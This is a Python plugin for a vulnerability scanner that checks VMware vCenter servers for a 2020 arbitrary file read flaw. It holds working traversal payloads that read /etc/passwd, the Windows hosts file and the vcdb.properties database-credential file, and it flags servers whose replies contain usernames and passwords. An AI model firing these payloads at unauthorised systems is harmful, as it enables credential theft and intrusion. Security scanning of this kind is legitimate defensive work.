#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
VMware vCenter 任意文件读取 (2020年)
    暂无编号
        Payload: https://blog.csdn.net/caiqiiqi/article/details/109092083
                 https://github.com/zhzyker/vulmap/blob/main/payload/Vmware.py

VMware vCenter特定版本存在任意文件读取漏洞
    攻击者可通过向受影响主机发送特制请求来利用此漏洞
    成功利用此漏洞的攻击者可在目标服务器上读取任意文件
'''

from lib.tool import check
from PluginManager import Vuln_Scan

class Scan(Vuln_Scan):
    def __init__(self):
        self.payloads = [
            # * Linux
            {'path': 'eam/vib?id=/etc/passwd'},
            {'path': 'vib?id=/etc/passwd'},
            # * Windows
            {'path': 'eam/vib?id=C:\\Windows\\System32\\drivers\\etc\\hosts'},
            {'path': 'vib?id=C:\\Windows\\System32\\drivers\\etc\\hosts'},
            {'path': 'eam/vib?id=C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts'},
            {'path': 'vib?id=C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts'},
            # * vcenter config file
            {'path': 'eam/vib?id=C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx\\vcdb.properties'},
            {'path': 'vib?id=C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx\\vcdb.properties'},
            {'path': 'eam/vib?id=C:\\\\ProgramData\\\\VMware\\\\vCenterServer\\\\cfg\\\\vmware-vpx\\\\vcdb.properties'},
            {'path': 'vib?id=C:\\\\ProgramData\\\\VMware\\\\vCenterServer\\\\cfg\\\\vmware-vpx\\\\vcdb.properties'},
        ]
    
    def POC(self, clients):
        client = clients.get('reqClient')
        
        vul_info = {
            'app_name': 'VMware-vCenter',
            'vul_type': 'FileRead',
            'vul_id': 'vcenter-2020-10-fileread',
        }
        
        for payload in self.payloads:
            path = payload['path']

            res = client.request(
                'get',
                path,
                allow_redirects=False,
                vul_info=vul_info
            )
            if res is None:
                continue

            if (check.check_res_fileread(res.text)
                or (r"driver" in res.text and r"username" in res.text and r"password" in res.text)
            ):
                results = {
                    'Target': res.url,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results
        return None
    
    def EXP(self, clients):
        pass

    def Start(self, clients):
        return self.POC(clients)
